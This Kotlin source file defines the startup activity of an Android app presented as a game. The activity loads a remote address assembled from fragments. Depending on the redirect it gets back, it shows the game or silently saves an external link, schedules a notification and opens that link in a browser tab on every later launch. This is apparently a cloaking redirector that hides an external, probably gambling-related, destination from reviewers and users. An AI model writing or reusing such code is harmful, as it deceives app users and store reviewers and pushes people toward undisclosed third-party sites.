package com.lukaszgalinski.gamefuture.view

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.lukaszgalinski.gamefuture.R
import com.lukaszgalinski.gamefuture.notification.GameMessage
import com.lukaszgalinski.gamefuture.tools.GamePreferences
import kotlinx.android.synthetic.main.activity_first.*

class FirstActivity : AppCompatActivity() {
    private var preference : GamePreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_first)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        supportActionBar?.hide()
        preference = GamePreferences(this).apply { getSharedPreference("gameweb") }
        val apiLink = preference!!.getString("gameweb")
        if(apiLink != null && apiLink != "") exec(apiLink)
        else checkInternet()
    }

    private fun exec(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    private fun checkInternet(){
        wiki_response.settings.javaScriptEnabled = true
        wiki_response.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(req.contains("p.php")){
                    goToList()
                }
                else{
                    if(req.contains("google.com")){
                        goToList()
                    }
                    else if(!req.contains("bonusik")){
                        GameMessage().scheduleNotification(this@FirstActivity)
                        preference?.putString("gameweb", "http://jitraf.space/PQxtqj")
                        exec("http://jitraf.space/PQxtqj")
                    }

                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        val protocol = "http://"
        val site = "jitraf.space/"
        val php = "smwBBs"
        wiki_response.loadUrl("$protocol$site$php")
    }

    private fun goToList(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, SplashScreenActivity::class.java))
        wiki_response.destroy()
    }
}